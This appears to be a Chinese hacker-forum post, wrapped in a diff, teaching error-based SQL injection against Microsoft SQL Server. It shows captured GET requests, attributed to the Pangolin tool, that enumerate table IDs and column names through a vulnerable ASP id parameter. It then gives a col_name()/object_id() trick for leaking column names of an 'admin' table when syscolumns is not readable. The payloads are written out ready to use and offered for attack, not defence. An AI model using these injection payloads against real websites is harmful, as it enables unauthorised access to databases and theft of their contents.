@@ -1,0 +1,35 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SqlServer注射暴列名的另一种方法
+D8888D主贴内容-------------------------------------------------------
+作者：ninty
+文章首发作者BLOG [url=http://www.forjj.com/]链接标记http://www.forjj.com/[/url]
+后提交至T00LS，转载请注明出处。
+
+先来抓包看一个PANGOLIN的暴列名的语句 ，十分经典：
+SQL代码
+
+   1. GET /sql.asp?id=1 and (select top 1 cast(id as nvarchar(20))+char(124)  from [pubs]..[sysobjects] where name=0x4400390039005f0054006d007000)=0-- 取得要暴列名的表的ID  
+   2.   
+   3. GET /sql.asp?id=1 and (select cast(count(1) as varchar(10))+char(94) from [pubs]..[syscolumns] where id=757577737)=0-- 得到此表的列的数量  
+   4.   
+   5. GET /sql.asp?id=1 and (select top 1 cast(name as varchar(8000)) from (select top 1 colid,name from [pubs]..[syscolumns] where id=757577737 order by colid) t order by colid desc)=0-- 开始从syscolumns里面报列名了。  
+
+其它的注入工具也大同小异，都是从syscolumns里面取得列名。
+
+但是，如果出于某些原因，我们无法从syscolumns表里面取得数据该怎么办？比如我们没有syscolumns表的select权限。
+
+下面就是文章的重点了，其实说白了也就是一个函数的应用 ：
+SQL代码
+
+   1. select 1 where 1=(select isnull(col_name(object_id('admin'),3),'meiyoucilie'))  
+
+上面这条语句表示得到admin表的第三个列的名称，并与1进行比较，结果肯定是会报错的，通过报错结果我们就可以将第三列的名字暴出来了，没有用到syscolumns表哦。
+
+用到的是col_name函数，它有两个参数，第一个就是表的ID，第二个就是列的索引。这个索引是从1开始的。
+如果指定索引的号不存在。 比如admin表里面一共才三个列，结果索引传了个4进去 ，就会报错说
+"meiyoucilie"
+
+语句在SQL SERVER 2000的环境下测试通过。
+新手在学习SQL SERVER时发现的小技巧，牛人请误见笑，如果有错误还请提出来 。。
